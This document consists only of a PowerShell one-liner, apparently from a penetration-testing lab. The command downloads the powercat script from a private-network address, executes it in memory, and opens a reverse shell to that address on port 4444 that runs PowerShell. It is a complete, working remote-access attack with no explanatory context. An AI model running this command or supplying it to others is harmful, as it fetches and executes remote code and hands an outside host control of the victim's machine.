powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:8000/powercat.ps1'); powercat -c 192.168.45.181 -p 4444 -e powershell"
